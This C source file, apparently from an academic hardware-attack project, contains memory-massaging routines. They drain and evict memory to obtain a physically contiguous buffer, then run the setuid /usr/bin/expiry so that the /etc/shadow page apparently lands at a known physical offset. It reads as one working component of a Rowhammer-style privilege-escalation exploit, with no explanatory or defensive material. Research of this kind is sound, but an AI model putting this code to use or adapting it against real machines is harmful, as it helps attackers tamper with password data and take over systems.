/*
 * Copyright (C) 2025 Matej Bölcskei, ETH Zurich
 * Licensed under the GNU General Public License as published by the Free Software Foundation, version 3.
 * See LICENSE or <https://www.gnu.org/licenses/gpl-3.0.html> for details.
 * 
 * SPDX-License-Identifier: GPL-3.0-only
 */

#define _GNU_SOURCE

#include "massage_shadow.h"
#include "cache_files.h"

#include <sys/mman.h>
#include <unistd.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdio.h>

#define PAGE_SIZE 0x1000UL
#define MAX_BLOCK_SIZE 0x400000UL
#define ZONE_RESERVE 0xc0000000UL
#define REMAP_ADDRESS 0x200000000UL
#define PCP_FLOOD_SIZE 0x200000UL
#define SHADOW_OFFSET 0x3a000UL
#define MAX_ALLOC_TRIES 10

int allocate_contiguous_evict_shadow(uintptr_t (*get_pa)(void *), size_t alloc_size, void **return_ptr, uintptr_t *return_pa) {
  size_t drain_size = 0;
  void *drain = MAP_FAILED;
  void *contiguous = MAP_FAILED;
  uintptr_t start_pa = 0;
  size_t alignment = MAX_BLOCK_SIZE > alloc_size ? alloc_size : MAX_BLOCK_SIZE;
  for (int try = 0; try < MAX_ALLOC_TRIES && contiguous == MAP_FAILED; ++try) {
    drain_size = PAGE_SIZE * sysconf(_SC_AVPHYS_PAGES) - ZONE_RESERVE;
    drain = mmap(NULL, drain_size, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    if (drain == MAP_FAILED) {
      perror("mmap");
      continue;
    }

    void *drain_end = (void *)((uintptr_t)drain + drain_size - PAGE_SIZE - MAX_BLOCK_SIZE);
    uintptr_t drain_end_pa = get_pa(drain_end);
    void *aligned = (void *)((uintptr_t)drain_end -
                            (drain_end_pa % alignment) - alloc_size);
    contiguous = mremap(aligned, alloc_size, alloc_size,
                            MREMAP_FIXED | MREMAP_MAYMOVE, REMAP_ADDRESS);
    if (contiguous == MAP_FAILED) {
      munmap(drain, drain_size);
      perror("mremap");
      continue;
    }
    
    start_pa = get_pa(contiguous);
    if (start_pa % alignment != 0) {
      munmap(drain, drain_size);
      munmap(contiguous, alloc_size);
      contiguous = MAP_FAILED;
      printf("Non-contiguous allocation detected: start_pa: %lx\n", start_pa);
    }
  }

  if (contiguous == MAP_FAILED) {
    return -1;
  }

  size_t evict_size = 3*sysconf(_SC_AVPHYS_PAGES)*PAGE_SIZE/2;
  void *evict_ptr = mmap(NULL, evict_size, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  if (evict_ptr == MAP_FAILED) {
    munmap(drain, drain_size);
    munmap(contiguous, alloc_size);
    return -1;
  }
  sleep(1);

  munmap(evict_ptr, evict_size);
  munmap(drain, drain_size);

  *return_ptr = contiguous;
  *return_pa = start_pa;
  return 0;
}

int allocate_contiguous_massage_shadow(uintptr_t (*get_pa)(void *), size_t alloc_size, void **return_ptr, uintptr_t *return_pa, uintptr_t *shadow_hint) {
  struct stat st;
  size_t expiry_size;
  stat("/usr/bin/expiry", &st);
  expiry_size = st.st_size;
  
  void *contiguous_ptr = MAP_FAILED;
  uintptr_t contiguous_pa;

  int expiry_fd;
  void *expiry_ptr;

  pid_t child = vfork();
  if (!child) {    
    if (allocate_contiguous_evict_shadow(get_pa, alloc_size + PCP_FLOOD_SIZE, &contiguous_ptr, &contiguous_pa)) {
      exit(EXIT_FAILURE);
    }

    expiry_fd = open("/usr/bin/expiry", O_RDONLY);
    if (expiry_fd < 0) { perror("open: /usr/bin/expiry"); exit(EXIT_FAILURE); }
    expiry_ptr = mmap(NULL, expiry_size, PROT_READ | PROT_EXEC, MAP_SHARED | MAP_POPULATE, expiry_fd, 0);
    cache_files();
    
    munmap(contiguous_ptr, PCP_FLOOD_SIZE);
    fexecve(expiry_fd, (char *[]){"expiry", "-c", NULL}, (char *[]){NULL});
  }

  if (contiguous_ptr == MAP_FAILED) {
    return -1;
  }

  munmap(expiry_ptr, expiry_size);
  close(expiry_fd);
  close_files();
  
  *return_ptr = (void *)((uintptr_t)contiguous_ptr + PCP_FLOOD_SIZE);
  *return_pa = contiguous_pa + PCP_FLOOD_SIZE;
  *shadow_hint = contiguous_pa + SHADOW_OFFSET;
  return 0;
}